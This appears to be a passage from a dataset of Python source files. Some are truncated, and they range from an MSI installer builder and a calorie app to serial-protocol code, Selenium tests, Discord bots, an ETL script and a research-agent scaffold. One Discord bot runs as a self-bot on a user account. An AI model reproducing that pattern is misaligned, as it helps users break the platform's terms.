17, flags, title, next)\n\n    def cancel(self, title, next, name = \"Cancel\", active = 1):\n        \"\"\"Add a cancel button with a given title, the tab-next button,\n        its name in the Control table, possibly initially disabled.\n\n        Return the button, so that events can be associated\"\"\"\n        if active:\n            flags = 3 # Visible|Enabled\n        else:\n            flags = 1 # Visible\n        return self.pushbutton(name, 304, self.h-27, 56, 17, flags, title, next)\n\n    def next(self, title, next, name = \"Next\", active = 1):\n        \"\"\"Add a Next button with a given title, the tab-next button,\n        its name in the Control table, possibly initially disabled.\n\n        Return the button, so that events can be associated\"\"\"\n        if active:\n            flags = 3 # Visible|Enabled\n        else:\n            flags = 1 # Visible\n        return self.pushbutton(name, 236, self.h-27, 56, 17, flags, title, next)\n\n    def xbutton(self, name, title, next, xpos):\n        \"\"\"Add a button with a given title, the tab-next button,\n        its name in the Control table, giving its x position; the\n        y-position is aligned with the other buttons.\n\n        Return the button, so that events can be associated\"\"\"\n        return self.pushbutton(name, int(self.w*xpos - 28), self.h-27, 56, 17, 3, title, next)\n\nclass bdist_msi(Command):\n\n    description = \"create a Microsoft Installer (.msi) binary distribution\"\n\n    user_options = [('bdist-dir=', None,\n                     \"temporary directory for creating the distribution\"),\n                    ('plat-name=', 'p',\n                     \"platform name to embed in generated filenames \"\n                     \"(default: %s)\" % get_platform()),\n                    ('keep-temp', 'k',\n                     \"keep the pseudo-installation tree around after \" +\n                     \"creating the distribution archive\"),\n                    ('target-version=', None,\n                     \"require a specific python version\" +\n                     \" on the target system\"),\n                    ('no-target-compile', 'c',\n                     \"do not compile .py to .pyc on the target system\"),\n                    ('no-target-optimize', 'o',\n                     \"do not compile .py to .pyo (optimized) \"\n                     \"on the target system\"),\n                    ('dist-dir=', 'd',\n                     \"directory to put final built distributions in\"),\n                    ('skip-build', None,\n                     \"skip rebuilding everything (for testing/debugging)\"),\n                    ('install-script=', None,\n                     \"basename of installation script to be run after \"\n                     \"installation or before deinstallation\"),\n                    ('pre-install-script=', None,\n                     \"Fully qualified filename of a script to be run before \"\n                     \"any files are installed.  This script need not be in the \"\n                     \"distribution\"),\n                   ]\n\n    boolean_options = ['keep-temp', 'no-target-compile', 'no-target-o",
    "import tkinter as tk\nfrom tkinter import messagebox\nimport requests\nimport json\n\n# Load local fallback data\ndef load_local_data():\n    try:\n        with open(\"local_data.json\", \"r\") as file:\n            return json.load(file)\n    except FileNotFoundError:\n        return {}\n\nlocal_data = load_local_data()\n\n# Function to search for calories\ndef search_calories():\n    product_name = entry.get().strip().lower()\n    if not product_name:\n        messagebox.showwarning(\"Error\", \"Please enter a product name!\")\n        return\n\n    # Check local data first\n    if product_name in local_data:\n        product = local_data[product_name]\n        result_label.config(\n            text=f\"Calories: {product['calories']} kcal\\n\"\n                 f\"Protein: {product['protein']} g\\n\"\n                 f\"Fats: {product['fats']} g\\n\"\n                 f\"Carbs: {product['carbs']} g\"\n        )\n        return\n\n    # Query OpenFoodFacts API\n    url = f\"https://world.openfoodfacts.org/cgi/search.pl?search_terms={product_name}&search_simple=1&json=1\"\n    response = requests.get(url)\n\n    if response.status_code != 200:\n        messagebox.showerror(\"Error\", \"Failed to connect to the API. Check your internet connection.\")\n        return\n\n    data = response.json()\n    products = data.get(\"products\", [])\n    if not products:\n        messagebox.showinfo(\"Result\", f\"No products found for '{product_name}'.\")\n        return\n\n    # Get the first product from the API results\n    product = products[0]\n    nutrients = product.get(\"nutriments\", {})\n\n    # Fetch values or show \"Data not available\"\n    calories = nutrients.get(\"energy-kcal_100g\", \"Data not available\") #calories\n    protein = nutrients.get(\"proteins_100g\", \"Data not available\") #protein\n    fats = nutrients.get(\"fat_100g\", \"Data not available\") #fats\n    carbs = nutrients.get(\"carbohydrates_100g\", \"Data not available\") # carbo\n\n    result_label.config(\n        text=f\"Calories: {calories} kcal\\nProtein: {protein} g\\nFats: {fats} g\\nCarbs: {carbs} g\"\n    )\n\n# Function to clear the input and output\ndef clear_fields():\n    entry.delete(0, tk.END)\n    result_label.config(text=\"\")\n\n# Tkinter GUI setup\nwindow = tk.Tk()\nwindow.title(\"Calorie Calculator\")\n\n# Input field\ntk.Label(window, text=\"Enter the product name:\").pack(pady=5)\nentry = tk.Entry(window, width=30)\nentry.pack(pady=5)\n\n# Buttons\ntk.Button(window, text=\"Search\", command=search_calories).pack(pady=5)\ntk.Button(window, text=\"Clear\", command=clear_fields).pack(pady=5)\n\n# Result display\nresult_label = tk.Label(window, text=\"\", font=(\"Arial\", 12), justify=tk.LEFT)\nresult_label.pack(pady=10)\n\nwindow.mainloop()\n",
    "from __future__ import annotations\n\nimport asyncio\nimport collections\nimport contextlib\nimport dataclasses\nimport functools\nimport logging\nimport re\nimport typing\n\nimport async_timeout\nimport click\nimport crc\nimport serial_asyncio\nimport zigpy.serial\n\nif typing.TYPE_CHECKING:\n    from typing_extensions import Self\n\n_LOGGER = logging.getLogger(__name__)\n\nCONNECT_TIMEOUT = 1\nPROBE_TIMEOUT = 2\n\n\nCRC_CCITT = crc.Calculator(\n    crc.Configuration(\n        width=16,\n        polynomial=0x1021,\n        init_value=0x0000,\n        final_xor_value=0x0000,\n        reverse_input=False,\n        reverse_output=False,\n    )\n)\n\nCRC_KERMIT = crc.Calculator(\n    crc.Configuration(\n        width=16,\n        polynomial=0x1021,\n        init_value=0xFFFF,\n        final_xor_value=0xFFFF,\n        reverse_input=True,\n        reverse_output=True,\n    )\n)\n\n\n# Used by both CPC and XModem\ndef crc16_ccitt(data: bytes) -> int:\n    return CRC_CCITT.checksum(data)\n\n\n# Used by HDLC-Lite\ndef crc16_kermit(data: bytes) -> int:\n    return CRC_KERMIT.checksum(data)\n\n\ndef pad_to_multiple(data: bytes, multiple: int, padding: bytes) -> bytes:\n    assert len(padding) == 1\n\n    if len(data) % multiple == 0:\n        return data\n\n    num_complete_blocks = len(data) // multiple\n    padded_size = multiple * (num_complete_blocks + 1)\n\n    return data + padding * (padded_size - len(data))\n\n\nclass BufferTooShort(Exception):\n    \"\"\"Protocol buffer requires more data to parse a packet.\"\"\"\n\n\nclass StateMachine:\n    \"\"\"Asyncio-friendly state machine.\"\"\"\n\n    def __init__(self, states: set[str], initial: str) -> None:\n        if initial not in states:\n            raise ValueError(f\"Unknown initial state {initial!r}: expected {states!r}\")\n\n        self._states = states\n        self._state = initial\n\n        self._futures_for_state: typing.DefaultDict[str, list[asyncio.Future]] = (\n            collections.defaultdict(list)\n        )\n\n    @property\n    def state(self) -> str:\n        return self._state\n\n    @state.setter\n    def state(self, state: str) -> None:\n        if state not in self._states:\n            raise ValueError(f\"Unknown state {state!r}: expected {self._states!r}\")\n\n        self._state = state\n\n        for future in self._futures_for_state[state]:\n            future.set_result(None)\n\n    async def wait_for_state(self, state: str) -> None:\n        \"\"\"Waits for a state. Returns immediately if the state is active.\"\"\"\n        assert state in self._states\n\n        if self.state == state:\n            return\n\n        future = asyncio.get_running_loop().create_future()\n        self._futures_for_state[state].append(future)\n\n        try:\n            return await future\n        finally:\n            # Always clean up the future\n            self._futures_for_state[state].remove(future)\n\n\nclass SerialProtocol(asyncio.Protocol):\n    \"\"\"Base class for packet-parsing serial protocol implementations.\"\"\"\n\n    def __init__(self) -> None:\n        self._buffer = bytearray()\n        self._transport: serial_asyncio.SerialTransport | None = None\n        self._connected_event = asyncio.Event()\n\n    async def wait_until_connected(self) -> None:\n        \"\"\"Wait for the protocol's transport to be connected.\"\"\"\n        await self._connected_event.wait()\n\n    def connection_made(self, transport: serial_asyncio.SerialTransport) -> None:\n        _LOGGER.debug(\"Connection made: %s\", transport)\n\n        self._transport = transport\n        self._connected_event.set()\n\n    def send_data(self, data: bytes) -> None:\n        \"\"\"Sends data over the connected transport.\"\"\"\n        assert self._transport is not None\n        data = bytes(data)\n        _LOGGER.debug(\"Sending data %s\", data)\n        self._transport.write(data)\n\n    def data_received(self, data: bytes) -> None:\n        _LOGGER.debug(\"Received data %s\", data)\n        self._buffer += data\n\n    def disconnect(self) -> None:\n        if self._transport is not None:\n            self._transport.close()\n            self._buffer.clear()\n            self._connected_event.clear()\n\n\ndef patch_pyserial_asyncio() -> None:\n    \"\"\"Patches pyserial-asyncio's `SerialTransport` to support swapping protocols.\"\"\"\n\n    if (\n        serial_asyncio.SerialTransport.get_protocol\n        is not asyncio.BaseTransport.get_protocol\n    ):\n        return\n\n    def get_protocol(self) -> asyncio.Protocol:\n        return self._protocol\n\n    def set_protocol(self, protocol: asyncio.Protocol) -> None:\n        self._protocol = protocol\n\n    serial_asyncio.SerialTransport.get_protocol = get_protocol\n    serial_asyncio.SerialTransport.set_protocol = set_protocol\n\n\n@contextlib.asynccontextmanager\nasync def connect_protocol(port, baudrate, factory):\n    loop = asyncio.get_running_loop()\n\n    async with async_timeout.timeout(CONNECT_TIMEOUT):\n        _, protocol = await zigpy.serial.create_serial_connection(\n            loop=loop,\n            protocol_factory=factory,\n            url=port,\n            baudrate=baudrate,\n        )\n        await protocol.wait_until_connecte",
    "import pytest\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\n\n@pytest.fixture(scope=\"session\")\ndef driver():\n    driver = webdriver.Chrome()  # Replace with your desired browser\n    yield driver\n    driver.quit()\n\ndef test_search_functionality(driver):\n    # Navigate to the Selenium Playground Table Search Demo\n    driver.get(\"https://www.lambdatest.com/selenium-playground/table-sort-search-demo.html\")\n\n    # Locate and interact with the search box\n    search_box = WebDriverWait(driver, 10).until(\n        EC.presence_of_element_located((By.XPATH, '//input[@type=\"text\"]'))\n    )\n    search_box.send_keys(\"New York\")\n\n    # Validate the search results\n    results_text = WebDriverWait(driver, 10).until(\n        EC.presence_of_element_located((By.XPATH, '//div[@class=\"dataTables_info\"]'))\n    ).text\n    assert \"Showing 5 entries out of 24 total entries\" in results_text\n",
    "import argparse\nimport os\nimport sys\nfrom typing import Tuple\n\nfrom Bio import SeqIO\nfrom Bio.Seq import Seq\nfrom Bio.SeqRecord import SeqRecord\nfrom Bio.SeqUtils.ProtParam import ProteinAnalysis\n\nfrom pyhmmer.plan7 import HMMFile\nfrom pyhmmer.easel import SequenceFile\nfrom pyhmmer.hmmer import hmmscan\n\n\ndef compute_physical_properties(seq: Seq) -> Tuple[float, float]:\n    molecular_weight, isoelectric_point = None, None\n\n    if not set(seq).difference('ACDEFGHIKLMNPQRSTVWY'):\n        analysed_seq = ProteinAnalysis(seq)\n        molecular_weight = round(analysed_seq.molecular_weight() / 1000, 1)\n        isoelectric_point = round(analysed_seq.isoelectric_point(), 2)\n\n    return molecular_weight, isoelectric_point\n\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument(\n        '--tsv',\n        default='./predicted_proteases.tsv',\n        help='Path to the output file in TSV format '\n        '(default is ./predicted_proteases.tsv).',\n    )\n    parser.add_argument(\n        '--faa',\n        default='./predicted_proteases.faa',\n        help='Path to the output file in FASTA format '\n        '(default is ./predicted_proteases.faa).',\n    )\n    parser.add_argument(\n        '--evalue',\n        '-e',\n        default=1e-3,\n        type=float,\n        help='E-value threshold for filtering results (default is 1e-3).',\n    )\n    parser.add_argument('hmmfile', help='Path to the HMM database.')\n    parser.add_argument('seqfile', help='Path to the query sequences.')\n\n    args = parser.parse_args()\n\n    if not os.path.exists(args.hmmfile):\n        sys.exit(f'File {args.hmmfile} not found.')\n\n    if not os.path.exists(args.seqfile):\n        sys.exit(f'File {args.seqfile} not found.')\n\n    return args\n\n\ndef main() -> None:\n    args = parse_args()\n\n    with (\n        open(args.tsv, mode='w') as tsv_output_file,\n        open(args.faa, mode='w') as faa_output_file,\n        HMMFile(args.hmmfile) as profiles,\n        SequenceFile(args.seqfile, digital=True) as queries,\n    ):\n        print(\n            'accession',\n            'family',\n            'molecular_weight',\n            'isoelectric_point',\n            sep='\\t',\n            file=tsv_output_file,\n        )\n\n        for hits in hmmscan(queries, profiles, E=args.evalue):\n            if hits:\n                accession = hits.query.name.decode()\n                family = hits[0].name.decode().upper()\n\n                seq = Seq(hits.query.textize().sequence)\n                molecular_weight, isoelectric_point = compute_physical_properties(seq)\n\n                print(\n                    accession,\n                    family,\n                    molecular_weight,\n                    isoelectric_point,\n                    sep='\\t',\n                    file=tsv_output_file,\n                )\n                SeqIO.write(\n                    SeqRecord(\n                        seq, id=accession, description=f'Putative {family} peptidase'\n                    ),\n                    faa_output_file,\n                    'fasta',\n                )\n",
    "\r\nimport a2s\r\nfrom discord.ext import commands\r\n\r\nbot = commands.Bot(command_prefix='>', self_bot=True)\r\n\r\nlist_servers = [\r\n    ('5.42.211.48',24215),\r\n    ('5.42.211.48', 24217),\r\n    ('194.147.90.131', 24215),\r\n    ('194.147.90.131', 24217)\r\n]\r\n@bot.command()\r\nasync def ping(ctx):\r\n    await ctx.send('pong')\r\n\r\n\r\n@bot.event\r\nasync def on_message(message):\r\n    print(message.content)\r\n    if message.content == '!status' and message.channel.id == 1271789595909951492:\r\n        text = '\u0411\u043e\u0442 \u0441\u043e\u0437\u0434\u0430\u043d > thebogler \u0435\u0441\u043b\u0438 \u0447\u0442\u043e \u0442\u043e \u043d\u0435 \u0440\u0430\u0431\u043e\u0442\u0430\u0435\u0442 \u043f\u0438\u0448\u0438\u0442\u0435 \u0435\u043c\u0443'\r\n        for server in list_servers:\r\n            try:\r\n                adres = a2s.info(server, timeout=2)\r\n                text += f'''```fix\r\nIP: {server[0]}:{server[1]}\r\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\nNAME: {adres.server_name}\r\nMAP: {adres.map_name}\r\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\nPLAYER COUNT: {adres.player_count}/{adres.max_players}```'''\r\n\r\n            except:\r\n                print('\u0421\u0435\u0440\u0432\u0435\u0440 \u0441 IP', server,'\u041d\u0435 \u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d')\r\n\r\n\r\n\r\n        await message.channel.send(text+\"\\n\u0411\u043e\u0442 \u043d\u0435 \u0440\u0430\u0431\u043e\u0442\u0430\u0435\u0442 \u0432 <#1271789595909951488> \u0438\u0437 \u0437\u0430 \u0442\u043e\u0433\u043e \u0447\u0442\u043e \u043e\u0434\u0438\u043d \u0447\u0435\u043b\u043e\u0432\u0435\u043a \u043d\u0430\u0447\u0430\u043b \u0441\u043f\u0430\u043c\u0438\u0442\u044c, \u0438 \u0431\u043e\u0442 \u043d\u0430\u0447\u0430\u043b \u0437\u0430\u0441\u043e\u0440\u044f\u0442\u044c \u0447\u0430\u0442\\n\u041a\u0430\u043a \u0441\u043c\u043e\u0433\u0443 \u043d\u0430\u043f\u0438\u0448\u0443 \u0441\u0438\u0441\u0442\u0435\u043c\u0443 \u0434\u043b\u044f \u0430\u043d\u0442\u0438\u0441\u043f\u0430\u043c\u0430\")\r\n\r\n\r\nbot.run('123123')",
    "import discord\nfrom discord.ext import commands\nfrom discord.ext import tasks\nfrom discord import app_commands\nfrom pytrends.request import TrendReq\nimport asyncio\nfrom datetime import datetime, timedelta\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport io\nimport seaborn as sns\nimport logging\n\n# Set up logging\nlogging.basicConfig(\n    level=logging.INFO,\n    format='%(asctime)s [%(levelname)s] %(message)s',\n    handlers=[\n        logging.StreamHandler(),\n        logging.FileHandler('bot.log')\n    ]\n)\n\n# Initialize Discord bot with commands and PyTrends\nintents = discord.Intents.default()\nintents.message_content = True\nbot = commands.Bot(command_prefix=commands.when_mentioned, intents=intents)\npytrends = TrendReq(hl='en-US', tz=360)\n\n# Constants\nCHANNEL_ID = 1319290513114796032\nINTERVAL_HOURS = 8\nEMBED_COLOR = 0x2F3136  # Discord dark theme color\n\n# Country code mapping\nCOUNTRY_CODES = {\n    'united_states': 'US',\n    'india': 'IN',\n    'brazil': 'BR',\n    'united_kingdom': 'GB',\n    'germany': 'DE',\n    'france': 'FR',\n    'canada': 'CA',\n    'australia': 'AU',\n    'spain': 'ES',\n    'italy': 'IT',\n    'russia': 'RU',\n    'mexico': 'MX',\n    'south_korea': 'KR',\n    'netherlands': 'NL',\n    'turkey': 'TR',\n    'indonesia': 'ID',\n    'switzerland': 'CH',\n    'sweden': 'SE',\n    'poland': 'PL',\n    'belgium': 'BE',\n    'norway': 'NO',\n    'argentina': 'AR',\n    'austria': 'AT',\n    'denmark': 'DK',\n    'singapore': 'SG',\n    'ireland': 'IE',\n    'greece': 'GR',\n    'portugal': 'PT',\n    'new_zealand': 'NZ',\n    'finland': 'FI',\n    'malaysia': 'MY',\n    'israel': 'IL',\n    'philippines': 'PH',\n    'south_africa': 'ZA',\n    'thailand': 'TH',\n    'vietnam': 'VN'\n}\n\n# Suppress pandas future warnings\nimport warnings\nimport io\nwarnings.simplefilter(action='ignore', category=FutureWarning)\n\nasync def create_trend_charts(trends_data, country_name=\"Global\"):\n    \"\"\"Create visualizations of trend data with DejaVu Sans font and dark theme.\"\"\"\n    # Set the dark theme and background color\n    sns.set_style(\"darkgrid\")\n    plt.rcParams['axes.facecolor'] = '#2F3136'\n    plt.rcParams['figure.facecolor'] = '#2F3136'\n    plt.rcParams['savefig.facecolor'] = '#2F3136'\n\n    # Set the font to DejaVu Sans\n    plt.rcParams['font.family'] = 'DejaVu Sans'\n\n    # Adjust font colors to contrast the dark background\n    title_color = 'white'\n    label_color = 'white'\n    tick_color = 'white'\n\n    fig, (ax1, ax2) = plt.subplots(2, 1, figsize=(15, 12))\n\n    # Plot 1: Interest Over Time\n    trends = [t['trend'] for t in trends_data[:10]]\n    values = [t['interest'] for t in trends_data[:10]]\n\n    sns.barplot(x=values, y=trends, palette='coolwarm', ax=ax1)\n    ax1.set_title(f'Top 10 Trends by Interest - {country_name}', fontsize=14, pad=20, color=title_color)\n    ax1.set_xlabel('Interest Score', fontsize=12, color=label_color)\n    ax1.set_ylabel('Trends', fontsize=12, color=label_color)\n    ax1.tick_params(axis='x', colors=tick_color)\n    ax1.tick_params(axis='y', colors=tick_color)\n\n    # Plot 2: Growth Rates\n    growth_rates = [t['growth_rate'] for t in trends_data[:10]]\n\n    # Create color mapping based on growth rates\n    colors = ['#2ecc71' if x >= 0 else '#e74c3c' for x in growth_rates]\n    sns.barplot(x=growth_rates, y=trends, palette=colors, ax=ax2)\n    ax2.set_title(f'Growth Rates of Top 10 Trends - {country_name}', fontsize=14, pad=20, color=title_color)\n    ax2.set_xlabel('Growth Rate (%)', fontsize=12, color=label_color)\n    ax2.set_ylabel('Trends', fontsize=12, color=label_color)\n    ax2.tick_params(axis='x', colors=tick_color)\n    ax2.tick_params(axis='y', colors=tick_color)\n\n    plt.tight_layout()\n\n    buf = io.BytesIO()\n    plt.savefig(buf, format='png', dpi=300, bbox_inches='tight',\n                facecolor=fig.get_facecolor(), edgecolor='none')\n    buf.seek(0)\n    plt.close()\n\n    return discord.File(buf, filename='trend_analysis.png')\n\nasync def get_trends(country=None):\n    try:\n        if country:\n            country = country.lower().replace(' ', '_')\n            if country not in COUNTRY_CODES:\n                raise ValueError(f\"Country '{country}' not supported\")\n            trending_searches = pytrends.trending_searches(pn=country)\n        else:\n            trending_searches = pytrends.trending_searches(pn='united_states')  # Default to global/US trends\n            \n        top_20_trends = trending_searches.head(20).values.flatten().tolist()\n        current_time = datetime.utcnow()\n        \n        trends_data = []\n        for trend in top_20_trends:\n            growth_rate = get_trend_growth(trend)\n            trends_data.append({\n                'trend': trend,\n                'growth_rate': growth_rate,\n                'timestamp': current_time,\n                'interest': 100 - top_20_trends.index(trend) * 5\n            })\n        \n        country_name = country.replace('_', ' ').title() if country else \"Global\"\n        \n        # Main embed with cleaner formatting\n        main_embed = discord.Embed(\n",
    "import csv, os, sqlite3\nFOLDER = \"DATA\"\ndata_curr = [] ### CURRENT_AUTHORS_BOOKS.CSV\ndata_legacy = [] ### LEGACY_AUTHORS_BOOKS.CSV\n### EXTRACT DATA\ndef extract():\n    ### CURRENT AUTHORS\n    with open(FOLDER + os.sep +\\\n              \"current_authors_books.csv\", \"r\") as file:\n        reading = csv.DictReader(file)\n        for row in reading:\n            data_curr.append({\n                \"author_id\": row[\"id\"],\n                \"author\": row[\"Author Name\"],\n                \"title\": row[\"Book Title\"],\n                \"price\": float(row[\"Price (GBP)\"]),\n            })\n    ### LEGACY AUTHORS\n    with open(FOLDER + os.sep +\\\n              \"legacy_authors_books.csv\", \"r\") as file:\n        reading = csv.DictReader(file)\n        for row in reading:\n            data_legacy.append({\n                \"author_id\": row[\"id\"],\n                \"author\": row[\"Author Name\"],\n                \"title\": row[\"Book Title\"],\n                \"price\": float(row[\"Price (GBP)\"]),\n            })\n\n### TRANSFORM DATA\ndef transform():\n    [data_curr[i].update({\"type\": \"current\"})\n        for i in range(len(data_curr))]\n\n    [data_legacy[i].update({\"type\": \"legacy\"})\n        for i in range(len(data_legacy))]\n\n    combined_data = data_curr + data_legacy\n    \n    return combined_data\n\n\n### LOAD DATA\ndef load():\n    combined_data = transform()\n    ### CREATE BOOKS TABLE\n    conn = sqlite3.connect(\"bookstore.db\")\n    cursor = conn.cursor()\n    cursor.execute(\"\"\"\n    CREATE TABLE IF NOT EXISTS Books(\n        id INTEGER PRIMARY KEY,\n        author TEXT NOT NULL,\n        author_id INTEGER NOT NULL,\n        title TEXT NOT NULL UNIQUE,\n        price REAL NOT NULL,\n        type TEXT NOT NULL,\n        FOREIGN KEY (author_id) REFERENCES Authors(id)\n    )\n    \"\"\")\n    \n    ### INSERT DATA INTO BOOKS TABLE\n    for book in combined_data: ### LIST OF DICTIONARIES\n        cursor.execute(\"\"\"\n        INSERT INTO Books (author, author_id, title, price, type)\n        VALUES (?, ?, ?, ?, ?)\n        \"\"\", (book[\"author\"], int(book[\"author_id\"]),\n              book[\"title\"], float(book[\"price\"]), \n             book[\"type\"]\n             ))\n    conn.commit()\n    conn.close()\n    \n    print(\"Inserted data into Books table. ETL process completed\")\n    \ndef main():\n    extract()\n    load()\n    \nif __name__ == \"__main__\":\n    main()",
    "import requests\nimport time\nfrom datetime import datetime, timezone, UTC\nimport json\n\n\nclass ExchangeRates:\n    def __init__(self, exchange_rate_file='exchange_rates.json'):\n        self.exchange_rate_file = exchange_rate_file\n        self.ONE_DAY = 24 * 60 * 60\n        self.last_update_time = None\n        self.URL = \"https://open.er-api.com/v6/latest/USD\"\n\n    def check_last_update(self):\n        # Checks when exchange rates were last updated. Exchange rates update once every 24 hours, so there's no need to update more often than that.\n        try:\n            with open(self.exchange_rate_file, 'r') as file:\n                self.content = json.load(file)\n        except:\n            print(f\"{self.exchange_rate_file} not found.\")\n            self.is_outdated = True\n        else:\n            self.next_update_time = self.content[\"time_next_update_unix\"]\n            self.last_update_time = self.content[\"time_last_update_unix\"]\n            \n            current_unix_time = datetime.now(timezone.utc).timestamp()\n\n            self.is_outdated = current_unix_time > self.next_update_time\n\n    def update(self):\n        self.check_last_update()\n\n        try:\n            last_update_time_str = datetime.fromtimestamp(self.last_update_time, UTC).strftime(\"%Y-%m-%d %H:%M:%SZ\")\n        except:\n            last_update_time_str = \"Never\"\n    \n        if self.is_outdated:\n            print(f\"Exchange rates are outdated. Last updated: {last_update_time_str}.\")\n        else:\n            next_update = datetime.fromtimestamp(self.next_update_time, UTC).strftime(\"%Y-%m-%d %H:%M:%SZ\")\n            print(f\"Exchange rates are up to date. Last updated: {last_update_time_str}. Next available update: {next_update}\")\n            return\n\n        response = requests.get(self.URL)\n\n        if response:\n            print(f\"Successfully retrieved exchange rates. Status code: {response.status_code}\")\n        else:\n            raise Exception(f\"Unable to retrieve exchange rates: Error Code {response.status_code}\")\n\n        data = response.json()\n\n        # Write to file\n        output_file = open(self.exchange_rate_file, \"w\")\n        json.dump(data, output_file, indent=4)\n        output_file.close()\n\nif __name__ == '__main__':\n    exchange_rates = ExchangeRates()\n    exchange_rates.update()\n",
    "from openai import OpenAI\nfrom termcolor import colored\nimport os\nimport re\nimport json\nfrom typing import List, Dict, Any, Tuple\nfrom dotenv import load_dotenv\nfrom smolagents import Tool, CodeAgent, DuckDuckGoSearchTool\nimport chromadb\nimport requests\nfrom bs4 import BeautifulSoup\nfrom datetime import datetime\nfrom sentence_transformers import SentenceTransformer\nimport uuid\nimport time\n\ndef print_step(message: str) -> None:\n    \"\"\"Print a step in the process with color.\"\"\"\n    print(colored(f\"[STEP] {message}\", \"cyan\"))\n\ndef print_error(message: str, error: Exception = None) -> None:\n    \"\"\"Print an error message with color.\"\"\"\n    error_msg = f\"[ERROR] {message}\"\n    if error:\n        error_msg += f\": {str(error)}\"\n    print(colored(error_msg, \"red\"))\n\ndef print_success(message: str) -> None:\n    \"\"\"Print a success message with color.\"\"\"\n    print(colored(f\"[SUCCESS] {message}\", \"green\"))\n\ndef create_output_folder(topic: str) -> str:\n    \"\"\"Create a timestamped output folder for the topic.\"\"\"\n    timestamp = datetime.now().strftime(\"%Y%m%d_%H%M%S\")\n    folder_name = f\"output/{topic.replace(' ', '_')}_{timestamp}\"\n    \n    # Create main output folder\n    os.makedirs(folder_name, exist_ok=True)\n    \n    # Create subdirectories for different types of output\n    os.makedirs(os.path.join(folder_name, \"debug\"), exist_ok=True)\n    os.makedirs(os.path.join(folder_name, \"research\"), exist_ok=True)\n    os.makedirs(os.path.join(folder_name, \"script\"), exist_ok=True)\n    os.makedirs(os.path.join(folder_name, \"evaluation\"), exist_ok=True)\n    \n    print_step(f\"Created output folder structure: {folder_name}\")\n    return folder_name\n\ndef save_debug_file(output_folder: str, content: str, filename: str) -> None:\n    \"\"\"Safely save debug content to a file.\"\"\"\n    try:\n        debug_path = os.path.join(output_folder, \"debug\", filename)\n        os.makedirs(os.path.dirname(debug_path), exist_ok=True)\n        with open(debug_path, \"w\", encoding=\"utf-8\") as f:\n            f.write(content)\n    except Exception as e:\n        print_error(f\"Failed to save debug file {filename}: {e}\")\n\n# Load environment variables\ntry:\n    load_dotenv()\n    print_step(\"Loaded environment variables from .env file\")\nexcept Exception as e:\n    print_error(\"Failed to load .env file\", e)\n\n# Constants\nDEEPSEEK_API_KEY = os.getenv(\"DEEPSEEK_API_KEY\")\nDEEPSEEK_BASE_URL = \"https://api.deepseek.com\"\nSERPAPI_KEY = os.getenv(\"SERPAPI_KEY\")\n\nclass ContentRetrieverTool:\n    \"\"\"Tool for retrieving and managing content.\"\"\"\n    def __init__(self, output_folder: str = None, urls_per_query: int = 3):\n        self.output_folder = output_folder\n        self.urls_per_query = urls_per_query\n        self.search_results = []\n        self.encoder = SentenceTransformer('all-MiniLM-L6-v2')\n        \n        if not SERPAPI_KEY:\n            raise ValueError(\"SERPAPI_KEY not found in environment variables\")\n        \n        # Initialize ChromaDB\n        if output_folder:\n            chroma_path = os.path.join(output_folder, \"chroma_db\")\n            self.client = chromadb.PersistentClient(path=chroma_path)\n        else:\n            self.client = chromadb.Client()\n            \n        self.collection = self.client.create_collection(\n            name=\"content_store\",\n            metadata={\"hnsw:space\": \"cosine\"}\n        )\n\n    def search_with_retry(self, query: str, max_retries: int = 3, delay: int = 2) -> List[Dict]:\n        \"\"\"Execute search with retries using SerpAPI.\"\"\"\n        from serpapi import GoogleSearch\n        import time\n        \n        for attempt in range(max_retries):\n            try:\n                search = GoogleSearch({\n                    \"q\": query,\n                    \"api_key\": SERPAPI_KEY,\n                    \"num\": self.urls_per_query * 2  # Get extra results in case some URLs fail\n                })\n                results = search.get_dict()\n                \n                if \"organic_results\" not in results:\n                    raise ValueError(\"No organic results found in SerpAPI response\")\n                    \n                return results[\"organic_results\"]\n                \n            except Exception as e:\n                if attempt < max_retries - 1:  # Don't sleep on the last attempt\n                    print_error(f\"Search attempt {attempt + 1} failed: {e}\")\n                    print_step(f\"Retrying in {delay} seconds...\")\n                    time.sleep(delay)\n                    delay *= 2  # Exponential backoff\n                else:\n                    raise  # Re-raise the last exception\n\n    def gather_content_with_queries(self, search_queries: List[str]):\n        \"\"\"Execute multiple search queries and gather content.\"\"\"\n        print_step(f\"Gathering content using {len(search_queries)} search queries...\")\n        \n        # Track processed URLs to avoid duplicates\n        processed_urls = set()\n        \n        for query in search_queries:\n            print_step(f\"Searching: {query}\")\n            try:\n                # Remove quotes from",
    "import os\nimport pandas as pd\nimport json\nfrom jinja2 import Template\n\ndef ensure_reports_directory():\n    reports_dir = \"reports\"\n    if not os.path.exists(reports_dir):\n        os.makedirs(reports_dir)\n    return reports_dir\n\n# Fun\u00e7\u00e3o centralizada para salvar arquivos JSON\ndef save_json_file(file_path, data):\n    try:\n        with open(file_path, \"w\") as file:\n            json.dump(data, file, indent=4)\n        print(f\"Arquivo JSON salvo com sucesso em '{file_path}'.\")\n    except Exception as e:\n        print(f\"Erro ao salvar arquivo JSON: {e}\")\n\ndef generate_html_report(results, output_file):\n    html_template = \"\"\"\n    <!DOCTYPE html>\n    <html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n        <title>API Test Report</title>\n        <style>\n            body {\n                font-family: Arial, sans-serif;\n                margin: 20px;\n                padding: 0;\n                background-color: #f4f4f9;\n                color: #333;\n            }\n            h1 {\n                text-align: center;\n                color: #444;\n            }\n            table {\n                width: 100%;\n                border-collapse: collapse;\n                margin: 20px 0;\n            }\n            th, td {\n                border: 1px solid #ddd;\n                padding: 8px;\n                text-align: center;\n            }\n            th {\n                background-color: #007BFF;\n                color: white;\n            }\n            tr:nth-child(even) {\n                background-color: #f9f9f9;\n            }\n        </style>\n    </head>\n    <body>\n        <h1>API Test Report</h1>\n        <table>\n            <thead>\n                <tr>\n                    <th>Route</th>\n                    <th>Method</th>\n                    <th>Status Code</th>\n                    <th>Response Time (s)</th>\n                    <th>Response</th>\n                    <th>Error</th>\n                </tr>\n            </thead>\n            <tbody>\n                {% for 